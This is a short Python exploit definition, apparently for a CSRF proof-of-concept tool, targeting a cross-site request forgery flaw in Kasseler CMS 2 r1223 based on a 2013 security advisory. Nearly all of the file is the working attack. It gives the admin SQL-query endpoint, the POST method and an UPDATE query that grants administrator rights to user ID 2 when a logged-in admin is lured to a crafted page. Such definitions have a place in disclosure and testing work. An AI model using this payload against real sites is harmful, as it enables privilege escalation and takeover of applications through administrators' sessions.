# -*- coding: utf-8 -*-

NAME = "Kasseler CMS 2 r1223 CSRF vulnerability"
DESCRIPTION = '''The vulnerability exists due to absence of CSRF protection mechanisms in the entire application. A remote attacker can trick logged-in administrator to visit a specially crafted webpage with CSRF exploit code. This will enable the attacker to execute arbitrary SQL queries in application's database and gain complete control over the application.

This CSRF exploit code will grant administrative privileges to user with ID=2.'''
AUTHOR = "High-Tech Bridge Security Research Lab"
AUTHOR_URL = "https://www.htbridge.com/advisory/"
DATE = "2013-07-03"

METHOD = "POST"
PATH = "/admin.php?module=database&do=sql_query"

PARAMS = [
    {
        "name": "query",
        "value": "UPDATE `kasseler`.`kasseler_users` SET `user_level` = '2', `user_group` = '1' WHERE `kasseler_users`.`uid` =2 LIMIT 1 ;",
        "custom": True,
        "description": "The SQL command to execute"
    }
]